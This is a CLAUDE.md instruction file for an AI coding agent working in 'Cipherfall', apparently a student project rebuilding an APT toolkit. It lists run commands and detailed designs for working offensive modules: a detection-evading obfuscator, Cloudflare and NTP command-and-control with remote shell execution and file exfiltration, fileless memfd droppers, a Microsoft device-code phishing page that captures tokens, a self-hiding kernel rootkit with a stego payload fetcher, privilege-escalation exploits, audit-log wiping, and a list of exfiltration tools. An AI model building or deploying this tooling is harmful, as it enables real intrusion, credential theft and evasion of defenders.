# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project context

Cipherfall is an ESGI annual project simulating the reconstruction of an APT's tooling arsenal. The modules cover the full attack lifecycle: reconnaissance, obfuscation, C2, dropping payloads, phishing, privilege escalation, rootkits, and anti-forensics. All code is for authorized security research and educational purposes.

## Module execution

```bash
# Phantom Eye — single semicolon-delimited output line
bash Modules/Recon/phantom_eye.sh

# ShadowScript: obfuscate a bash script (advanced: ROT13+chunks+random vars+decoys)
bash Modules/Obfuscator/shadowscript.sh <script.sh>

# ShadowScript: obfuscate a Python script (same technique but for .py)
python3 Modules/Obfuscator/shadowscript.py <script.py>

# EchoErase: ghost shell (root recommended for full coverage)
sudo bash Modules/Anti-forensics/echoerase_ghost.sh

# EchoErase: inject randomized sleep delays between lines of a script
bash Modules/Anti-forensics/echoerase_delayer.sh <script.sh> <fixed_delay_s> <jitter_s>

# EchoErase: rename a file (base64 stem by default, or random/ext options)
python3 Modules/Anti-forensics/echoerase_renamer.py [--no-recover] [--ext] [--view] <file>

# NullRelay: start Cloudflare C2 server (requires WORKER_URL env var)
cd Modules/C2/cloudflare-worker && pip install -r requirements.txt
WORKER_URL=https://... C2_PSK=... python3 server.py

# C2: interactive TUI dashboard (NullRelay / ClockVenom)
cd Modules/C2 && WORKER_URL=https://... C2_PSK=... python3 tui.py

# NullRelay: deploy Cloudflare Worker dead-drop
cd Modules/C2/cloudflare-worker && wrangler secret put WORKER_SECRET && wrangler deploy

# ClockVenom: start NTP C2 server (requires root or CAP_NET_BIND_SERVICE for UDP/123)
cd Modules/C2/ntp && pip install -r requirements.txt
sudo C2_PSK=... python3 server.py

# ClockVenom: print agent ID on target (no pip required)
python3 Modules/C2/ntp/clockvenom.py --id

# ShadowDrop: fileless binary execution via memfd_create
python3 Modules/Dropper/shadowdrop_bin.py

# ShadowDrop: fileless bash script execution via memfd_create
python3 Modules/Dropper/shadowdrop_sh.py

# ShadowDrop: fileless Python script execution via memfd_create + exec
python3 Modules/Dropper/shadowdrop_py.py

# PhantomPage: Microsoft device flow 2FA bypass (serves phishing page)
cd Modules/Phishing/deviceflowbypass2fa && pip install -r req.txt && python3 phantompage.py

# IronVeil: build and load LKM rootkit (requires linux-headers for current kernel)
apt install linux-headers-$(uname -r)   # Debian/Ubuntu
# pacman -S linux-headers               # Arch
cd Modules/Rootkits && make && sudo insmod ironveil.ko
# Note: build fails if the module path contains spaces — build from a symlinked path without spaces

# IronVeil dead-drop: embed payload URL into stego PNG (run once, then host the PNG)
python3 Modules/Rootkits/stego_embed.py <input_favicon.png> <payload_url> <output.png>
# Verify extraction:
python3 Modules/Rootkits/stego_embed.py --view <output.png>

# Privesc: DirtyFrag exploit (CVE)
cd Modules/Privesc/dirtyfrag && ./exp

# Privesc: ssh-keysign privilege escalation
cd Modules/Privesc/ssh-keysign-pwn && make && ./sshkeysign_pwn

# Privesc: Fragnesia namespace wrapper (CVE-2026-46300)
bash Modules/Privesc/fragnesia.sh

# Privesc: CopyFail splice-based privilege escalation (requires Python ≥ 3.10)
python3 Modules/Privesc/copyfail.py
```

## Architecture

Full attack pipeline: recon target → obfuscate payload → drop via fileless dropper → beacon to C2 via Cloudflare dead-drop → escalate privileges → persist with rootkit → cover tracks with anti-forensics.

**Phantom Eye** (`phantom_eye.sh`): Collects system fingerprint data using only built-in tools and standard binaries (`testparm`, `aws`, `psql`, `mongosh`, `gitlab-rake`, etc.). Falls back gracefully to `N/A` for each unavailable data source. Output is always exactly one line: `Distro;Version;Kernel;SMB_Shares;NFS_Exports;S3_Buckets;MariaDB_DBs;PostgreSQL_DBs;MongoDB_DBs;GitLab_Version`. DSM-specific fallbacks: Distro/Version from `/etc.defaults/VERSION` (`os_name`/`productversion` fields); SMB shares via `/usr/local/packages/@appstore/SMBService/usr/bin/testparm` (standard `testparm` absent from PATH on DSM); MariaDB via `/usr/local/mariadb10/bin/mysql` or `/var/packages/MariaDB10/target/usr/local/mariadb10/bin/mysql`; `showmount` wrapped in `timeout 5` to prevent blocking.

**ShadowScript** (`shadowscript.sh`, `shadowscript.py`): Stacks gzip → base64 → ROT13, then splits into variable-size chunks, shuffles chunk definition order (Fisher-Yates), encodes all command names in hex (`$'\x..'`) or chr() sequences, and injects decoy variables from a hardcoded fake-pool. The final stub never contains any readable string like `eval`, `base64`, or `gunzip`.

**NullRelay / ClockVenom** (`server.py`, `nullrelay.py` / `clockvenom.py`, `worker.js`, `tui.py`, `operator_cli.py`): Three-tier architecture — C2 server (operator-side, no public port) ↔ Cloudflare Worker KV dead-drop ↔ agent (victim-side). Server and agent never connect directly; all traffic is HTTPS/443 to Cloudflare edge.

_Dead-drop flow:_ (1) operator queues task → stored in SQLite as `pending`; (2) server dispatch loop PUTs encrypted task to Worker `PUT /task/{agent_id}` → marked `sent` on HTTP 200; (3) agent beacons: PUTs heartbeat to `/hb/{agent_id}`, GETs `/task/{agent_id}` (204 = nothing, 200 = execute), PUTs result to `/result/{task_id}`; (4) server collect loop GETs `/result/{task_id}` → decrypts, stores in SQLite, marks `done`.

_Encryption:_ AES-256-GCM. Key = PBKDF2-SHA256(PSK, `cipherfall_c2_v1`, 32 bytes, 100k iterations). Wire = `base64(nonce[12] ‖ ciphertext ‖ GCM-tag[16])`. Server uses pycryptodome; agent implements AES-256-GCM from scratch in pure Python stdlib (no pip on target).

_Authentication:_ `Authorization: Bearer <token>` where token = `HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]`, derived identically on server and agent. Worker returns 404 on bad token to avoid fingerprinting.

_Agent identity:_ SHA-256 of `/etc/machine-id` (fallback: hostname), truncated to 32 hex chars. Deterministic across reboots. Print with `python3 nullrelay.py --id` (or `clockvenom.py --id` for NTP agent). Agent spoofs `User-Agent: Mozilla/5.0 … Chrome/124`.

_Agent commands:_ any shell string (executed via `/bin/sh`, stdout+stderr returned); `UPLOAD:/path` (file read binary, returned as base64).

_Worker KV TTLs:_ task 1h, result 24h, heartbeat 10min. Task GET is one-time read (`ctx.waitUntil` delete). `GET /agents` lists all `hb:` keys for auto-discovery (max 1000).

_Server env vars:_ `WORKER_URL` (required), `C2_PSK` (default: `changeme`), `C2_DB` (`c2.db`), `C2_ADMIN` (port, default `1337`), `C2_POLL` (interval s, default `10`).

_Agent env vars (bake before obfuscating):_ `WORKER_URL` (required), `C2_PSK` (`changeme`), `C2_INT` (beacon interval s, `30`), `C2_JITTER` (±jitter s, `10`).

_Server admin API (127.0.0.1 only):_ `GET /admin/agents`, `GET /admin/tasks`, `POST /admin/register {agent_id, label?}`, `POST /admin/task {agent_id, command}`, `GET /admin/result/<task_id>`.

_TUI_ (`tui.py`, Textual + Rich): two tabs — **Agents** (list agents, browse tasks, dispatch commands, auto-refresh every 5s) and **Payload** (bakes `nullrelay.py` or `clockvenom.py` via regex substitution of constants, optionally calls `shadowscript.py`). Reads `C2_ADMIN_PORT` (default `1337`), `WORKER_URL`, `C2_PSK`.

_Operator CLI_ (`operator_cli.py`, stdlib only): `agents`, `register <id> [label]`, `tasks`, `task <id_prefix> <cmd>` (prefix min 4 chars), `result <task_id>`, `wait <task_id>` (polls every 5s).

_Worker deployment:_ `wrangler kv:namespace create "C2_KV"` → paste id in `wrangler.toml`; `wrangler secret put WORKER_SECRET` (paste derived token); `wrangler deploy`.

_Limitations:_ task lost if agent crashes after GET before PUT result (re-queue manually); one pending task per agent at a time; SQLite not suitable for large deployments; agent has no persistence (pair with dropper).

**ShadowDrop** (`shadowdrop_bin.py`, `shadowdrop_sh.py`, `shadowdrop_py.py`): Fileless execution via `memfd_create(2)` — payload downloaded over HTTP(S) never touches disk. Binary dropper: `MFD_CLOEXEC` set, kernel execs the fd directly. Shell dropper: no `MFD_CLOEXEC` (fd must stay open for bash), exec via `/proc/self/fd/<n>`. Python dropper: similar to shell but invokes `python3`. All three support `DAEMON_MODE` for double-fork daemonization.

**Phishing** (`deviceflowbypass2fa/`): Microsoft OAuth 2.0 device authorization flow abuse. Flask server proxies requests to `login.microsoftonline.com/common/oauth2/v2.0/devicecode`, displays the user code via `outlook.html` phishing page, then polls for token completion to capture access + refresh tokens. Scope includes `offline_access` to obtain long-lived refresh tokens.

**IronVeil** (`ironveil.c`, `stego_embed.py`): Linux LKM rootkit. Hooks `__x64_sys_read`, `__x64_sys_getdents64`, `__x64_sys_kill` via **kretprobes** (requires `CONFIG_KPROBES`). At load: (1) injects NTP-to-C2 redirect IPs into `/etc/hosts` for ClockVenom redirection; (2) hooks `read()` to filter those IPs from every process except ones named `ntp-agent` (ClockVenom agent sets this name via `prctl(PR_SET_NAME)` before DNS resolution); (3) self-hides from `lsmod`, `/proc/modules`, `/sys/module/`. Runtime file/PID hiding via `/proc/rootkit_ctrl` (write-only, itself hidden); max 64 PIDs, 64 filenames. Files prefixed `rootkit_` auto-hidden. `rmmod` unavailable after self-hide; hooks survive until reboot. **Dead-drop resolver**: at load, schedules a delayed kernel workqueue (5s) that calls `call_usermodehelper` to spawn `python3` with an embedded fetcher script. The script: renames itself `kworker/0:1H` via `prctl`; sleeps 60–300s (random); fetches a PNG from `STEGO_IMG_URL`; walks PNG chunks to find `tEXt` keyword `X-Payload`; base64-decodes and XOR-decrypts (16-byte key, same as `stego_embed.py`) to recover the payload URL; double-forks and execs the payload fileless via `memfd_create`. Operator workflow: run `stego_embed.py` to embed URL into a PNG, host it publicly, set `STEGO_IMG_URL` + `PYTHON3_PATH` in `ironveil.c`, rebuild. Build prereq: `linux-headers-$(uname -r)`. Kernel compat: ≥ 6.1 with BHI mitigations (kretprobe on `x64_sys_call`), 5.7–6.x (kallsyms via kprobe), 4.x–5.6 (kallsyms exported directly). Tested on Debian 12, kernel 6.1.0-49-amd64. Bypasses: `mmap()` and `pread64()` on `/etc/hosts` not hooked — true content readable. File hiding blocks `getdents` only; direct path access (`cat /path/file`) unaffected.

**ClockVenom** (`ntp/clockvenom.py`, `ntp/server.py`): NTP-tunnelled C2. Agent resolves its distro's default NTP domain (e.g. `ntp.ubuntu.com`) — operator compromises `/etc/hosts` on target to redirect that domain to the C2 server. Commands and results are hidden in NTS Cookie extension fields (type `0x0104`, RFC 8915) of standard NTP Mode-3/4 packets; clean 48-byte requests sent when idle. Encryption same AES-256-GCM + PBKDF2-SHA256 scheme as NullRelay. Server binds UDP/123 (requires root) + FastAPI admin HTTP on `127.0.0.1:1338`; `operator_cli.py` and `tui.py` work against it unchanged. Env vars: `C2_PSK`, `C2_DB` (`ntp_c2.db`), `C2_ADMIN` (`1338`), `C2_DEBUG`.

**Privesc** (`dirtyfrag/`, `ssh-keysign-pwn/`, `fragnesia.sh`, `copyfail.py`): Four exploits. `dirtyfrag` targets CVE via fragmented memory. `ssh-keysign-pwn` abuses `ssh-keysign` SUID binary (also includes `chage_pwn.c` and `exploit_vuln_target.c`). `fragnesia.sh` sets up a user+network namespace (CVE-2026-46300 prerequisite) via `unshare --user --map-root-user --net` and drops into an interactive shell ready to run the actual exploit — it is the namespace wrapper, not the exploit binary itself. `copyfail.py` implements splice-based arbitrary-write via AF_ALG + KTLS socket (ctypes `libc.splice()`), overwrites `/bin/su` in-place kernel-copy-style, then calls `os.system("su")`; requires Python ≥ 3.10.

**EchoErase — ghost-shell** (`echoerase_ghost.sh`): Five phases: (1) disable kernel auditing (`auditctl -e 0`) + stop auditbeat; (2) erase utmp/wtmp entries for current TTY via `utmpdump -r`; (3) zero lastlog for current UID via `dd` (seek to `uid * 292`); (4) scrub environment variables (SSH_*, SUDO_*, terminal fingerprints); (5) exec shell spoofed as `[kworker/u:0]` via `exec -a`. `trap EXIT` restores audit rules. Limitation: `/proc/<PID>/exe` still points to real bash.

**EchoErase — delayer** (`echoerase_delayer.sh`): Injects `sleep <N>` after each substantive line, skipping comments, blank lines, backslash/pipe continuations, and shell control keywords. Delay randomized via awk with nanosecond seed.

**EchoErase — renamer** (`echoerase_renamer.py`): Renames files using base64 URL-safe stem encoding (RFC 4648 §5, no padding, reversible via `--view`). `--no-recover`: random 6-char alphanumeric stem (CSPRNG, irreversible). `--ext`: replaces extension with a plausible alternative from a family table. All modes combinable except `--view` + `--ext`.

## Test environments

**Synology DSM VM** (`192.168.5.44`): DSM 7.2.2-72806, kernel 4.4.302+. Used to validate Phantom Eye DSM fallbacks and enumerate LOLBins. Credentials stored separately, not in this file.

_Key DSM paths:_
- Version info: `/etc.defaults/VERSION`
- SMB config: `/etc/samba/smb.conf` (shares not visible via grep — use testparm below)
- SMB testparm: `/usr/local/packages/@appstore/SMBService/usr/bin/testparm`
- smbd binary: `/usr/local/packages/@appstore/SMBService/usr/sbin/smbd`
- MariaDB (if installed via Package Center): `/usr/local/mariadb10/bin/mysql` or `/var/packages/MariaDB10/target/usr/local/mariadb10/bin/mysql`
- Syno backup tool: `/usr/syno/bin/synobackup`
- Shared folder sync: `/usr/syno/bin/s2s_syncer <task_id>`
- Syno copy utility: `/usr/syno/bin/synocopy`

_LOLBins confirmed present on DSM 7.2.2 (usable for exfil without pip):_
`curl`, `wget`, `python3` (3.8.15), `python` (2.x), `php`, `openssl` (1.1.1u), `ssh`, `scp`, `sftp`, `rsync`, `base64`, `xxd`, `od`, `gzip`, `bzip2`, `tar`, `dd`, `cat`, `tee`, `awk`, `sed`

_Backup LOLBins (trafic légitime):_ `synobackup` (Hyper Backup, nécessite tâche préconfigurée), `s2s_syncer` (Shared Folder Sync, nécessite tâche préconfigurée), `rsync`/`scp` (standards, aucune config).

## Coding conventions

- Each file starts with a detailed header block explaining what the module does, all techniques used, and known limitations (see existing files as reference).
- No inline or explanatory comments anywhere else in the code — only the header.
- When adding a new module, test it before reporting it complete; if a live test is not possible, explicitly say so.
- Variable names in obfuscated stubs are always randomly generated at obfuscation time, not hardcoded.
